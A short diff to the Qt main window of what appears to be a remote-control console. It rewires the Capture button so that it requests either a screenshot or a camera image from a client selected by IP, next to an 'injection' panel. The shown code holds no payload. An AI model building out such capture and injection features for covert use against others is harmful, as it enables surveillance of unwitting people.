@@ -100,11 +100,13 @@ MainWindow::MainWindow(Server* server, QWidget* parent)
     });
     connect(m_server, &Server::injectResultReceived, m_injectionPanel, &InjectionPanel::onInjectResult);
 
-    // Screenshot: bridge Capture button → server
-    connect(m_mediaPanel, &MediaPanel::screenshotRequested, this, [this](const QString& ip) {
-        m_server->sendScreenshotCommand(ip);
-        onStatusMessage(QString("Screenshot requested from %1").arg(ip));
-    });
+    // Screenshot/Camera: bridge Capture button → server
+    connect(m_mediaPanel, &MediaPanel::screenshotRequested, this,
+        [this](const QString& ip, uint8_t subtype) {
+            m_server->sendScreenshotCommand(ip, subtype);
+            const char* name = (subtype == 2) ? "Camera" : "Screenshot";
+            onStatusMessage(QString("%1 requested from %2").arg(name).arg(ip));
+        });
     connect(m_server, &Server::screenshotReceived, m_mediaPanel, &MediaPanel::displayScreenshot);
     connect(m_mediaPanel, &MediaPanel::statusMessage, this, &MainWindow::onStatusMessage);
 
